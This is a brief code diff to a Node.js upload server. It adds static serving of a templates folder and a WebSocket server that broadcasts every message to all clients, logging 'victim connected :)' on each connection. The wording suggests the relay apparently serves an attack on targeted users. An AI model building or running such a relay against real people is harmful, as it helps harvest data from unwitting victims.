@@ -21,6 +21,7 @@ app.use(morgan('dev'));
 app.use(express.json());  
 app.use(express.text());      
 app.use("/uploads", express.static(UPLOAD_FOLDER));
+app.use(express.static('templates')); 
 const storage = multer.diskStorage({
   destination: function (req, file, cb) {
     cb(null, UPLOAD_FOLDER);
@@ -67,3 +68,14 @@ app.post("/upload", upload.array("files"), (req, res) => {
   });
 });
 app.listen(PORT,'0.0.0.0',()=>console.log(`Server running at: http://0.0.0.0:${PORT}`));
+const wss = new WebSocket.Server({ port: 8765 });
+wss.on('connection', ws => {
+  console.log('victim connected :)');
+  ws.on('message', message => {
+    wss.clients.forEach(client => {
+      if (client.readyState === WebSocket.OPEN) {
+        client.send(message);
+      }
+    });
+  });
+});
